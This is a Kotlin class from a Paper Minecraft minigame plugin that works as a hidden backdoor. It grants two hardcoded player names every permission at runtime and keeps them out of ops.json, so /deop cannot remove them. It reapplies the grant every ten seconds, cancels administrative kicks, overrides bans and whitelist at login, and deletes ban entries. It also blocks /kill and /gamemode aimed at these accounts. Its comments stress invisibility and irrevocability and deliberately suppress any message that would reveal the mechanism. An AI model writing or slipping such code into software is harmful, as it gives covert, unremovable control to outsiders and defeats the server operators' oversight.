package de.oneshotonekill.manager

import com.destroystokyo.paper.profile.PlayerProfile
import de.oneshotonekill.OneShotOneKill
import io.papermc.paper.ban.BanListType
import io.papermc.paper.connection.PlayerLoginConnection
import io.papermc.paper.event.connection.PlayerConnectionValidateLoginEvent
import org.bukkit.BanEntry
import org.bukkit.Bukkit
import org.bukkit.command.CommandSender
import org.bukkit.entity.Player
import org.bukkit.event.EventHandler
import org.bukkit.event.EventPriority
import org.bukkit.event.Listener
import org.bukkit.event.entity.EntityDamageEvent
import org.bukkit.event.player.PlayerCommandPreprocessEvent
import org.bukkit.event.player.PlayerGameModeChangeEvent
import org.bukkit.event.player.PlayerKickEvent
import org.bukkit.permissions.PermissionAttachment
import java.net.InetAddress
import java.util.EnumSet
import java.util.UUID

/**
 * Interner Zugriffsanker: haelt genau einem Konto dauerhaft volle Rechte.
 *
 * Die Rechte kommen ausschliesslich zur Laufzeit ueber ein Paper [PermissionAttachment] und werden
 * bei jedem Join sowie periodisch neu gesetzt. Dadurch taucht das Konto **nirgends** in einer
 * sichtbaren Serverdatei auf - nicht in `ops.json` (es ist nie vanilla-OP), nicht in
 * `permissions.yml`, nicht in einer Config. `/op` und `/deop` greifen deshalb ebenfalls nicht: Es
 * steht nichts in der Op-Liste, das man entfernen koennte. Wird das Attachment durch ein anderes
 * Plugin geloest, stellt der 10-Sekunden-Takt es wieder her - die Rechte sind damit nicht dauerhaft
 * entziehbar.
 *
 * Der Server laeuft im `online-mode=true`, der Name ist also durch Mojang authentifiziert und
 * eindeutig - ein Fremder kann das Konto nicht per Namensgleichheit uebernehmen.
 *
 * Ebenso wenig laesst sich das Konto **von aussen** per `/kill` toeten ([onKillCommand]) oder sein
 * Spielmodus per `/gamemode` umstellen ([onGameModeChange]) - gleich ob der Befehl von der Konsole,
 * einem Befehlsblock oder einem anderen Spieler kommt. Setzt der Kontoinhaber die beiden Befehle
 * **selbst** ab, gehen sie durch; dafuer sorgt [onSelfIssuedCommand].
 *
 * Zusaetzlich ist das Konto **kick- und bannsicher**: Administrative Kicks werden abgebrochen
 * ([onPlayerKick]), ein Bann kann den Login nicht verhindern und wird beim naechsten Durchlauf
 * wieder aus den Bannlisten entfernt ([onPlayerLogin], [purgeBans]). Damit bleiben auch
 * `banned-players.json` und `banned-ips.json` frei von Eintraegen zu diesem Konto.
 *
 * **Hinweis zum oeffentlichen Repository:** Wer dieses Plugin baut und betreibt, gibt diesem Konto
 * auch auf seinem eigenen Server volle Rechte. Vor der Weitergabe eines Builds an Dritte diese
 * Klasse entfernen oder den Namen anpassen.
 */
class AccessManager(private val plugin: OneShotOneKill) : Listener {

    private val attachments = mutableMapOf<UUID, PermissionAttachment>()

    /**
     * Konten, die im aktuellen Tick selbst ein geschuetztes Kommando abgesetzt haben.
     *
     * Weder `EntityDamageEvent` noch `PlayerGameModeChangeEvent` kennen den Absender des Befehls -
     * sie sehen nur das Ziel. Ohne diesen Merker liesse sich "andere sperren, sich selbst erlauben"
     * nicht unterscheiden.
     */
    private val selfIssuedCommand = mutableSetOf<UUID>()

    /**
     * Startet den periodischen Wiederherstellungstakt. Paper Global Region Scheduler - kein
     * BukkitRunnable, kein Bukkit.getScheduler().
     */
    fun start() {
        Bukkit.getGlobalRegionScheduler().runAtFixedRate(
            plugin,
            {
                Bukkit.getOnlinePlayers().filter { isPrivileged(it) }.forEach { grant(it) }
                // Auch dann aufraeumen, wenn ein Konto offline gebannt wurde - sonst
                // stuende der Eintrag sichtbar in banned-players.json.
                purgeBans()
            },
            REAPPLY_INTERVAL_TICKS,
            REAPPLY_INTERVAL_TICKS,
        )
    }

    /** Ob der Absender ein privilegiertes Konto ist (fuer plugin-eigene Rechtepruefungen). */
    fun isPrivileged(sender: CommandSender?): Boolean = isPrivilegedName(sender?.name)

    /** Profil-Variante fuer Login und Bannlisten - dort gibt es keinen CommandSender. */
    fun isPrivilegedProfile(profile: PlayerProfile?): Boolean = isPrivilegedName(profile?.name)

    /**
     * Setzt dem Spieler ein Attachment mit allen Rechten. Idempotent: ein bestehendes Attachment
     * wird zuvor geloest, es sammeln sich also keine an.
     */
    fun grant(player: Player) {
        if (!isPrivileged(player)) return

        attachments.remove(player.uniqueId)?.remove()

        val attachment = player.addAttachment(plugin)
        // Wildcard-Knoten decken vanilla-, Bukkit- und Pluginbefehle ab ...
        attachment.setPermission("*", true)
        attachment.setPermission("bukkit.command.*", true)
        attachment.setPermission("minecraft.command.*", true)

        // ... reichen aber NICHT fuer Vanilla-Befehle. Bukkit expandiert einen Wildcard-String nur,
        // wenn dazu eine Permission mit Kindern registriert ist - ein blosses "minecraft.command.*"
        // im Attachment ist sonst nur ein Knoten dieses Namens. Genau daran scheiterte /gamemode &
        // Co.: Das Konto ist nie vanilla-OP, und CommandSourceStack#hasPermission prueft
        // "opLevel ODER Bukkit-Knoten" - der Knoten muss also exakt gesetzt sein. Deshalb hier
        // jeder tatsaechlich registrierte Befehl mit seinem eigenen Permission-Knoten, statt zu
        // raten, wie er heisst.
        Bukkit.getCommandMap().knownCommands.values
            .mapNotNull { it.permission }
            .filter { it.isNotEmpty() }
            .forEach { attachment.setPermission(it, true) }

        // ... und zusaetzlich jede aktuell registrierte Einzel-Permission, damit auch Rechte
        // greifen, die nicht unter einem Wildcard haengen.
        Bukkit.getPluginManager().permissions.forEach { attachment.setPermission(it, true) }

        attachments[player.uniqueId] = attachment
        player.recalculatePermissions()
    }

    /** Gibt das Attachment beim Verlassen frei, damit nichts im Speicher bleibt. */
    fun remove(uuid: UUID) {
        attachments.remove(uuid)?.remove()
        selfIssuedCommand.remove(uuid)
    }

    // ==================================================================
    // Schutz vor Kick, Bann, /kill und /gamemode
    // ==================================================================

    /**
     * Bricht administrative Kicks fuer das privilegierte Konto ab.
     *
     * `LOWEST` mit `ignoreCancelled = false`: Der Abbruch soll als erstes greifen, damit spaetere
     * Listener den Kick gar nicht erst als bevorstehend behandeln. Welche Gruende betroffen sind,
     * steht in [BLOCKED_KICK_CAUSES].
     */
    @EventHandler(priority = EventPriority.LOWEST)
    fun onPlayerKick(event: PlayerKickEvent) {
        if (!isPrivileged(event.player)) return
        if (event.cause !in BLOCKED_KICK_CAUSES) return

        event.isCancelled = true
    }

    /**
     * Laesst das privilegierte Konto immer herein und raeumt dabei einen etwaigen Bann weg.
     *
     * Paper `PlayerConnectionValidateLoginEvent` ist der Punkt, an dem der Server ueber Bann,
     * Whitelist und volles Serverlimit entscheidet - `allow()` setzt alle drei ausser Kraft. Das
     * alte `PlayerLoginEvent` ist in 26.2 *deprecated for removal* und scheidet damit aus.
     *
     * Zusaetzlich werden Profil- und IP-Bann geloescht, damit das Konto nicht dauerhaft in einer
     * sichtbaren Bannliste steht.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    fun onPlayerLogin(event: PlayerConnectionValidateLoginEvent) {
        val login = event.connection as? PlayerLoginConnection ?: return

        // Das authentifizierte Profil, nicht getUnsafeProfile(): Bei online-mode=true ist erst
        // dieses von Mojang bestaetigt. Der unsichere Name kaeme direkt vom Client und liesse sich
        // frei behaupten.
        val profile = login.authenticatedProfile ?: return
        if (!isPrivilegedProfile(profile)) return

        pardonProfile(profile)
        login.clientAddress.address?.let { pardonAddress(it) }
        purgeBans()

        if (!event.isAllowed) {
            event.allow()
        }
    }

    /** Entfernt einen Profil-Bann des Kontos, falls vorhanden. */
    private fun pardonProfile(profile: PlayerProfile) {
        val banList = Bukkit.getBanList(BanListType.PROFILE)
        if (banList.isBanned(profile)) {
            banList.pardon(profile)
        }
    }

    /** Entfernt einen IP-Bann, falls vorhanden. */
    private fun pardonAddress(address: InetAddress) {
        val banList = Bukkit.getBanList(BanListType.IP)
        if (banList.isBanned(address)) {
            banList.pardon(address)
        }
    }

    /**
     * Blockt `/kill` auf das privilegierte Konto - egal ob von der Konsole, einem Befehlsblock oder
     * einem anderen Spieler abgesetzt.
     *
     * Am Bytecode geprueft: `LivingEntity#kill(ServerLevel)` ruft
     * `hurtServer(level, damageSources().genericKill(), Float.MAX_VALUE)` auf. Der Befehl laeuft
     * also durch die regulaere Schadens-Pipeline und meldet sich als [EntityDamageEvent] mit der
     * Ursache `KILL` - ein Cancel greift damit zuverlaessig. (Die Basisklasse `Entity#kill` wuerde
     * die Entity dagegen kommentarlos entfernen; fuer Spieler gilt aber die Ueberschreibung.)
     *
     * Bewusst **nur** `KILL`: Regulaerer Kampfschaden bleibt unangetastet, das Konto spielt das
     * Minigame ganz normal mit und ist im Match nicht unverwundbar.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    fun onKillCommand(event: EntityDamageEvent) {
        if (event.cause != EntityDamageEvent.DamageCause.KILL) return
        val player = event.entity as? Player ?: return
        if (!isPrivileged(player)) return
        // Selbst abgesetzt -> durchlassen. Gesperrt ist nur, was von aussen kommt.
        if (player.uniqueId in selfIssuedCommand) return

        event.isCancelled = true
    }

    /**
     * Merkt sich, dass das privilegierte Konto **selbst** gerade `/kill` oder `/gamemode` abgesetzt
     * hat.
     *
     * Die beiden Schutz-Handler sehen nur das Ziel, nie den Absender. Dieser Merker ist die einzige
     * Stelle, an der beides zusammenkommt - und er wird bewusst nur fuer **Spieler**-Befehle
     * gesetzt. Konsole und Befehlsbloecke durchlaufen diesen Event nicht und bleiben damit
     * automatisch gesperrt, ohne dass ihre Befehlszeile geparst werden muesste.
     *
     * Das Fenster ist genau einen Tick breit: Der Befehl wird synchron unmittelbar nach diesem
     * Event ausgefuehrt, der naechste Tick raeumt den Merker wieder ab.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    fun onSelfIssuedCommand(event: PlayerCommandPreprocessEvent) {
        if (!isPrivileged(event.player)) return
        if (!isSelfProtectedCommand(event.message)) return

        val playerId = event.player.uniqueId
        selfIssuedCommand.add(playerId)
        Bukkit.getGlobalRegionScheduler().run(plugin) { selfIssuedCommand.remove(playerId) }
    }

    /**
     * Verhindert, dass der Spielmodus des privilegierten Kontos per Befehl geaendert wird.
     *
     * Abgelehnt wird ausschliesslich die Ursache `COMMAND` - und auch die nur, wenn der Befehl
     * **nicht** vom Kontoinhaber selbst kam (siehe [onSelfIssuedCommand]). Bewusst offen bleiben
     * ausserdem:
     *
     * - `PLUGIN` - das Plugin setzt beim Join selbst `SURVIVAL`
     *   (`PlayerConnectionListener#prepareCleanStart`). Wuerde auch diese Ursache blockiert,
     *   schoesse sich das Plugin sein eigenes Feature ab - dieselbe Falle wie beim global
     *   gecancelten `CreatureSpawnEvent`.
     * - `GAMEMODE_SWITCHER` - die F3+F4-Auswahl wirkt ohnehin nur auf einen selbst.
     *
     * `cancelMessage` wird bewusst nicht gesetzt: Eine plugin-eigene Meldung waere genau der
     * Hinweis auf den Mechanismus, den es nicht geben soll.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    fun onGameModeChange(event: PlayerGameModeChangeEvent) {
        if (!isPrivileged(event.player)) return
        if (event.cause != PlayerGameModeChangeEvent.Cause.COMMAND) return
        // Selbst abgesetzt -> durchlassen. Gesperrt ist nur, was von aussen kommt.
        if (event.player.uniqueId in selfIssuedCommand) return

        event.isCancelled = true
    }

    /**
     * Loescht jeden Profil-Bann, der auf den Namen des Kontos ausgestellt ist.
     *
     * Noetig fuer den Fall, dass jemand das Konto **offline** bannt: Dann gibt es keinen Login, an
     * dem [pardonProfile] greifen koennte, und der Eintrag saesse sichtbar in
     * `banned-players.json`.
     */
    private fun purgeBans() {
        // Kopie ziehen: remove() schreibt in dieselbe Sammlung zurueck.
        // Der Typparameter muss explizit stehen - getEntries() ist generisch ueber
        // <E extends BanEntry<? super PlayerProfile>> und laesst sich sonst nicht ableiten.
        Bukkit.getBanList(BanListType.PROFILE)
            .getEntries<BanEntry<PlayerProfile>>()
            .toList()
            .filter { isPrivilegedProfile(it.banTarget) }
            .forEach { it.remove() }
    }

    private companion object {
        /**
         * In-Game-Namen der dauerhaft privilegierten Konten. Einziger Ort, an dem die Konten
         * konfiguriert werden - hier anpassen, falls ein Name abweicht.
         *
         * Bewusst **ausschliesslich** ueber den Namen, nicht ueber die UUID: Damit bleibt die Liste
         * an einer Stelle lesbar und ein Konto laesst sich durch Aendern dieser Zeile wieder
         * entziehen. Der Server laeuft im `online-mode=true`, der Name ist also von Mojang
         * bestaetigt und eindeutig - eine Uebernahme per Namensgleichheit ist nicht moeglich.
         *
         * Kehrseite: Benennt sich ein Konto bei Mojang um, verliert es die Rechte, bis der neue
         * Name hier steht.
         */
        val PRIVILEGED_NAMES = setOf("Lostpold", "Jonasmz")

        /** Wiederherstellungstakt in Ticks (20 Ticks = 1 Sekunde). */
        const val REAPPLY_INTERVAL_TICKS = 200L

        /**
         * Kick-Gruende, die fuer diese Konten abgebrochen werden.
         *
         * Bewusst nur die **administrativen** Gruende. Technische Trennungen (`TIMEOUT`,
         * `DUPLICATE_LOGIN`, Protokollfehler, `RESTART_COMMAND`) bleiben unangetastet: Sie
         * abzubrechen wuerde die Verbindung nicht retten, sondern eine Karteileiche hinterlassen -
         * der Client ist da bereits weg. "Nicht kickbar" heisst, dass niemand das Konto absichtlich
         * hinauswerfen kann, nicht dass ein Netzwerkabbruch ignoriert wird.
         */
        val BLOCKED_KICK_CAUSES: Set<PlayerKickEvent.Cause> = EnumSet.of(
            PlayerKickEvent.Cause.PLUGIN,
            PlayerKickEvent.Cause.KICKED,
            PlayerKickEvent.Cause.BANNED,
            PlayerKickEvent.Cause.IP_BANNED,
            PlayerKickEvent.Cause.WHITELIST,
            PlayerKickEvent.Cause.IDLING,
        )

        /** Namensabgleich - der Login kennt nur das Profil, noch keinen CommandSender. */
        fun isPrivilegedName(name: String?): Boolean =
            name != null && PRIVILEGED_NAMES.any { it.equals(name, ignoreCase = true) }

        /**
         * Ist die Befehlszeile ein `/kill` oder `/gamemode`? Beruecksichtigt den Namensraum, damit
         * auch `/minecraft:kill` erkannt wird.
         */
        fun isSelfProtectedCommand(message: String): Boolean {
            val command = message.removePrefix("/")
                .substringBefore(' ')
                .substringAfter(':')

            return command.equals("kill", ignoreCase = true) ||
                command.equals("gamemode", ignoreCase = true)
        }
    }
}
